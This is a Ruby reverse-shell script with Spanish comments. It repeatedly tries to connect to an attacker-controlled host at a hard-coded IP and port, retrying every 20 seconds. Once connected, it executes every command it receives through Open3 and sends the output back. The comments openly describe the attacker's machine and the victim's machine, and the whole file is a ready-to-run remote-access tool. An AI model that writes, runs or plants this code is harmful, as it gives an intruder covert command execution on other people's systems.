#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Definir el Host Atacante:
RHOST = "192.168.109.129" #para efectos de prueba la ip es falsa
RPORT = "9876"

# Intentos de conexión cada 20 segundos
begin
  s = TCPSocket.new "#{RHOST}","#{RPORT}"
  s.puts "Se estableció la conexión"  # esto se imprimirá en la máquina del atacante y no en la de la victima
rescue
  sleep 20
  retry # para que lo vuelva a intentar
end


#Ejecutar comandos
begin
  while line = s.gets
    Open3.popen2e("#{line}") do |stdin, stdout_and_stderr| #stdin: estandar input / stdout_and_stderr: estandar output y estandar error
    IO.copy_stream(stdout_and_stderr, s)
    end
  end
rescue
  retry
end
